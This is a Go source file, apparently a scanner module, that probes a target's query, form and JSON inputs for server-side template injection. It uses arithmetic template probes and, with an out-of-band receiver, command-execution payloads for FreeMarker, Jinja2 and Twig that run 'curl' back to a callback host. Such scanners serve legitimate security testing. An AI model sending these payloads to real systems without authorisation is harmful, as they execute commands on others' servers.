package core

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type SSTIPayloadType string

const (
	SSTIMath SSTIPayloadType = "math"
	SSTIOOB  SSTIPayloadType = "oob"
)

type SSTIPayload struct {
	Type     SSTIPayloadType
	Value    string
	Expected string
	OOBID    string
}

type SSTIValidator struct{}

func (v *SSTIValidator) IsVulnerable(body string, payload SSTIPayload, oobHits []OOBHit) bool {
	if payload.Type == SSTIMath {
		// Vulnerable if body contains the evaluated math result, but NOT the literal template string
		if strings.Contains(body, payload.Expected) && !strings.Contains(body, payload.Value) {
			return true
		}
		return false
	} else if payload.Type == SSTIOOB {
		return len(oobHits) > 0
	}
	return false
}

// ServerSideTemplateInjectionSstiResult holds the result of the ServerSideTemplateInjectionSsti module execution.
type ServerSideTemplateInjectionSstiResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// ServerSideTemplateInjectionSsti executes the server_side_template_injection_ssti security technique.
type ServerSideTemplateInjectionSsti struct {
	BaseModule
	Target  string
	results []ServerSideTemplateInjectionSstiResult
	OOB     *OOBManager

	attemptedProbes int64
	failedProbes    int64
}

// NewServerSideTemplateInjectionSsti creates a new instance.
func NewServerSideTemplateInjectionSsti(target string) *ServerSideTemplateInjectionSsti {
	return &ServerSideTemplateInjectionSsti{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *ServerSideTemplateInjectionSsti) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

func (m *ServerSideTemplateInjectionSsti) Execute(ctx context.Context) ([]ServerSideTemplateInjectionSstiResult, error) {
	m.Mu.Lock()
	m.results = make([]ServerSideTemplateInjectionSstiResult, 0)
	atomic.StoreInt64(&m.attemptedProbes, 0)
	atomic.StoreInt64(&m.failedProbes, 0)
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return m.results, err
	}

	vectors, _, err := m.DiscoverVectors(parsedURL, nil, "", req.Header)
	if err != nil {
		return m.results, err
	}
	hasQueryOrBody := false
	for _, v := range vectors {
		if v.Type == VectorQueryParam || v.Type == VectorFormBody || v.Type == VectorJSONBody {
			hasQueryOrBody = true
			break
		}
	}

	if !hasQueryOrBody {
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "q", Value: ""})
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "name", Value: ""})
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "template", Value: ""})
	}

	var payloads []SSTIPayload
	mathPayloads := []struct{ val, expected string }{
		{"{{4444*4444}}", "19749136"},
		{"${4444*4444}", "19749136"},
		{"<%= 4444*4444 %>", "19749136"},
		{"#{4444*4444}", "19749136"},
		{"*{4444*4444}", "19749136"},
	}
	for _, p := range mathPayloads {
		payloads = append(payloads, SSTIPayload{Type: SSTIMath, Value: p.val, Expected: p.expected})
	}

	if m.OOB != nil {
		oobPayloads := []string{
			"{{req('%%OOB_URL%%')}}",
			"${\"freemarker.template.utility.Execute\"?new()(\"curl %%OOB_URL%%\")}",
			"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"curl %%OOB_URL%%\") }",
			"{{ config.__class__.__init__.__globals__['os'].popen('curl %%OOB_URL%%').read() }}",
			"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"curl %%OOB_URL%%\")}}",
		}
		for _, p := range oobPayloads {
			payloads = append(payloads, SSTIPayload{Type: SSTIOOB, Value: p})
		}
	}

	type job struct {
		vector  InputVector
		payload SSTIPayload
	}

	jobChan := make(chan job, len(vectors)*len(payloads))
	for _, v := range vectors {
		for _, p := range payloads {
			jobChan <- job{vector: v, payload: p}
		}
	}
	close(jobChan)

	var wg sync.WaitGroup
	validator := &SSTIValidator{}

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobChan {
				select {
				case <-ctx.Done():
					return
				default:
					m.testVector(ctx, parsedURL, j.vector, j.payload, validator)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, nil
	case <-ctx.Done():
		<-done
		m.appendInconclusiveIfAllProbesFailed()
		return m.results, ctx.Err()
	}
}

// appendInconclusiveIfAllProbesFailed emits an inconclusive summary row when
// every probe ended in a transport/build failure, so an unreachable target is
// never reported as a clean scan.
func (m *ServerSideTemplateInjectionSsti) appendInconclusiveIfAllProbesFailed() {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if m.results == nil || len(m.results) > 0 {
		return
	}
	attempted := atomic.LoadInt64(&m.attemptedProbes)
	if attempted > 0 && atomic.LoadInt64(&m.failedProbes) >= attempted {
		m.results = append(m.results, ServerSideTemplateInjectionSstiResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceWeak, false),
			Detail: formatEvidenceDetail(EvidenceWeak, "All SSTI probes failed with transport errors or HTTP error responses; target reachability could not be established."),
		})
	}
}

func (m *ServerSideTemplateInjectionSsti) testVector(ctx context.Context, u *url.URL, vector InputVector, payload SSTIPayload, validator *SSTIValidator) {
	atomic.AddInt64(&m.attemptedProbes, 1)

	var req *http.Request
	var err error

	if payload.Type == SSTIOOB && m.OOB != nil {
		oobHost, oobID := m.OOB.GenerateOOBPayload()
		if oobHost == "" || oobID == "" {
			// No resolvable OOB host: the OOB payload cannot be tested at all.
			atomic.AddInt64(&m.failedProbes, 1)
			return
		}
		if !strings.HasPrefix(oobHost, "http://") && !strings.HasPrefix(oobHost, "https://") {
			oobHost = "http://" + oobHost
		}
		payload.Value = strings.ReplaceAll(payload.Value, "%%OOB_URL%%", oobHost)
		payload.OOBID = oobID
	}

	testValue := vector.Value + payload.Value

	method := "GET"
	if vector.Type == VectorFormBody || vector.Type == VectorJSONBody {
		method = "POST"
	}

	req, err = m.BaseModule.BuildRequestWithVector(ctx, method, u, vector, testValue)
	if err != nil || req == nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	defer resp.Body.Close()

	// A 4xx/5xx response means the engine rejected the template outright, so it
	// counts as an unusable probe; judging still proceeds in case the error body
	// leaks evaluated content (results short-circuit the summary below).
	if resp.StatusCode >= http.StatusBadRequest {
		atomic.AddInt64(&m.failedProbes, 1)
	}

	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		atomic.AddInt64(&m.failedProbes, 1)
		return
	}
	bodyStr := string(bodyBytes)

	// The math judge must not fire when the evaluated result is already present
	// in an ordinary response of the same vector (IDs, timestamps, plain value
	// reflection). Re-send the same vector without the template payload and skip
	// when the baseline body already contains the expected result.
	if payload.Type == SSTIMath {
		baseValue := strings.ReplaceAll(testValue, payload.Value, "")
		baseReq, err := m.BaseModule.BuildRequestWithVector(ctx, method, u, vector, baseValue)
		if err != nil || baseReq == nil {
			atomic.AddInt64(&m.failedProbes, 1)
			return
		}
		baseResp, err := m.Client.Do(baseReq)
		if err != nil {
			atomic.AddInt64(&m.failedProbes, 1)
			return
		}
		baseBytes, err := ReadBoundedBody(baseResp.Body, MaxResponseBodyBytes)
		baseResp.Body.Close()
		if err != nil {
			atomic.AddInt64(&m.failedProbes, 1)
			return
		}
		if strings.Contains(string(baseBytes), payload.Expected) {
			return
		}
	}

	var oobHits []OOBHit
	if payload.Type == SSTIOOB && m.OOB != nil && payload.OOBID != "" {
		oobHits = m.pollOOBHits(ctx, payload.OOBID)
		for _, h := range oobHits {
			m.RecordPoC(req, nil, oobHitDescription(payload.OOBID, h))
		}
	}

	// OOB confirmation routes through EvaluateDifferentialEvidence: a callback
	// is the true condition against the no-callback control baseline, so a
	// callback confirms while silence stays inconclusive.
	confirmed := false
	if payload.Type == SSTIOOB {
		confirmed = oobEvidenceTier(payload.OOBID, oobHits) == EvidenceConfirmed
	} else if validator.IsVulnerable(bodyStr, payload, oobHits) {
		confirmed = true
	}
	if confirmed {
		m.Mu.Lock()
		summary := fmt.Sprintf("SSTI (%s) successful in %s '%s' using payload: %s", payload.Type, vector.Type, vector.Key, payload.Value)
		if payload.Type == SSTIMath {
			summary += " (Result: " + payload.Expected + ")"
		}
		detail := formatEvidenceDetail(EvidenceConfirmed, summary)
		m.RecordPoC(req, nil, detail)
		m.results = append(m.results, ServerSideTemplateInjectionSstiResult{
			Target: m.Target,
			Status: statusFromEvidence(EvidenceConfirmed, false),
			Detail: detail,
		})
		m.Mu.Unlock()
	}
}

// pollOOBHits waits up to 5 seconds for out-of-band callbacks belonging to
// the given interaction id.
func (m *ServerSideTemplateInjectionSsti) pollOOBHits(ctx context.Context, id string) []OOBHit {
	timeout := time.After(5 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-timeout:
			return nil
		case <-ticker.C:
			if hits := m.OOB.Hits(id); len(hits) > 0 {
				return hits
			}
		}
	}
}

func init() {
	RegisterModule("server_side_template_injection_ssti", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting ServerSideTemplateInjectionSsti on: %s", target))

		tester := NewServerSideTemplateInjectionSsti(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))

		// Initialize OOB Manager for SSTI
		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				oob := &OOBManager{PublicHost: PayloadString(payload, "oob_host", "127.0.0.1")}
				if err := oob.StartOOBReceiver("127.0.0.1:0"); err == nil {
					onLog(fmt.Sprintf("OOB Receiver started on %s", oob.Listener.Addr().String()))
					tester.OOB = oob
					defer oob.StopOOBReceiver()
				} else {
					onLog(fmt.Sprintf("Warning: Failed to start OOB Receiver: %v. Proceeding with in-band only.", err))
				}
				return tester.Execute(ctx)
			},
		}, nil
	})
}
